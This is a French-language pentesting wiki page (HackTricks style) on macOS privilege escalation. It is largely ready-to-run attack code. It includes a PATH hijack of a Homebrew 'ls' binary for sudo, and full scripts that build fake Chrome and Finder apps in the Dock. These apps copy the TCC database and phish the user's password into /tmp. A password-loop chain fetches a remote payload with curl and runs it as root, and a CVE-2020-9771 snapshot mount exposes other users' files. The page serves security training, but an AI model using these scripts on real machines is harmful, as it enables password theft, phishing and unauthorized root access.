# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si vous cherchez TCC privilege escalation, rendez-vous sur :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Veuillez noter que **la plupart des techniques de privilege escalation affectant Linux/Unix affecteront également les machines MacOS**. Voir :


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interaction utilisateur

### Sudo Hijacking

Vous pouvez trouver la [technique Sudo Hijacking originale dans le post Linux Privilege Escalation](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **maintient** le **`PATH`** de l'utilisateur lorsqu'il exécute **`sudo`**. Cela signifie qu'une autre façon de réaliser cette attaque serait de **hijack d'autres binaries** que la victime exécutera lorsqu'elle lancera **`sudo`** :
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Notez qu'un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Usurpation du Dock

En utilisant un peu de **social engineering**, vous pourriez **impersonate for example Google Chrome** dans le Dock et réellement exécuter votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez dans le Dock s'il y a une instance de Chrome, et dans ce cas **supprimez** cette entrée et **ajoutez** la **fausse** **entrée Chrome à la même position** dans le tableau du Dock.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
- Une autre option est de ne pas le placer dans le Dock et simplement l'ouvrir — « Finder asking to control Finder » n'est pas si étrange.
- Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action :
  - Demandez à Finder de copier dans **`/etc/pam.d`** un nouveau fichier **`sudo`** (La fenêtre demandant le mot de passe indiquera que "Finder wants to copy sudo")
  - Demandez à Finder de copier un nouveau **Authorization Plugin** (Vous pouvez contrôler le nom du fichier afin que la fenêtre demandant le mot de passe indique que "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Le malware abuse fréquemment de l'interaction utilisateur pour **capturer un mot de passe utilisable avec sudo** et le réutiliser de manière programmatique. Un flux courant :

1. Identifier l'utilisateur connecté avec `whoami`.
2. **Boucler les invites de mot de passe** jusqu'à ce que `dscl . -authonly "$user" "$pw"` renvoie un succès.
3. Mettre en cache les identifiants (par ex., `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe via stdin).

Exemple de chaîne minimale:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Le mot de passe volé peut ensuite être réutilisé pour **supprimer la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d'autres fichiers privilégiés, et exécuter des étapes supplémentaires de façon non interactive.

## TCC - Escalade de privilèges root

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Tout utilisateur** (même non privilégié) peut créer et monter un snapshot Time Machine et **accéder À TOUS les fichiers** de ce snapshot.\
Le **seul privilège** nécessaire est que l'application utilisée (comme `Terminal`) dispose de **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), privilège qui doit être accordé par un administrateur.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Une explication plus détaillée peut être [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Informations sensibles

Cela peut être utile pour obtenir une élévation de privilèges :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Références

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
